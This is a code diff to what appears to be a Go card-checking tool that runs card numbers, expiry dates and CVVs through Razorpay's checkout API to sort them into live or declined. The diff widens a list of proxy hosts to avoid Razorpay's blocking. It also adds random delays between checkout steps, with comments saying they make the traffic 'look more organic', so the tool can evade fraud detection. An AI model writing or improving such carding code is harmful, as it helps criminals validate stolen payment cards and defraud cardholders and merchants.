@@ -238,6 +238,12 @@ var torOrBadHosts = []string{
 	"hetzner", "ovh", "contabo", "vps",
 	"proxy", "vpn", "res-", "res.",
 	"socks", "tunnel", "anonym",
+	// Fix #9: expanded with more datacenter/CDN/WAF hosts that Razorpay blocks
+	"ovhcloud", "leaseweb", "choopa",
+	"amazonaws", "cloudfront", "fastly",
+	"akamai", "incapsula", "sucuri",
+	"scaleway", "upcloud", "kamatera",
+	"hostwinds", "interserver", "staticip",
 }
 
 func isBadProxyHost(raw string) bool {
@@ -1778,6 +1784,9 @@ func checkCard(ctx context.Context, cc, mm, yy, cvv string, pp *parsedProxy, tar
 		resolvedCurrency = orderCurrency
 	}
 
+	// Fix #10: jitter between steps 2→3 (0.5-2s) to look more organic
+	time.Sleep(time.Duration(randInt(500, 2000)) * time.Millisecond)
+
 	// Step 3: Get checkout session
 	params3 := url.Values{
 		"traffic_env":        {"production"},
@@ -1820,6 +1829,9 @@ func checkCard(ctx context.Context, cc, mm, yy, cvv string, pp *parsedProxy, tar
 	if sessid == "" {
 		return CheckResult{Status: "error", Message: "Session token not found", Proxy: proxyRaw, ProxyStatus: "LIVE"}
 	}
+
+	// Fix #10: jitter between steps 3→4 (0.5-2s) to look more organic
+	time.Sleep(time.Duration(randInt(500, 2000)) * time.Millisecond)
 
 	rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
 		BUILD, BUILD_V1, rzpSessionID, sessid)
@@ -2140,6 +2152,9 @@ func checkCard(ctx context.Context, cc, mm, yy, cvv string, pp *parsedProxy, tar
 		}
 		return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 	}
+
+	// Fix #10: jitter between steps 7→8 (0.5-1.5s) to look more organic
+	time.Sleep(time.Duration(randInt(500, 1500)) * time.Millisecond)
 
 	pidClean := paymentID
 	if idx := strings.Index(paymentID, "_"); idx != -1 {
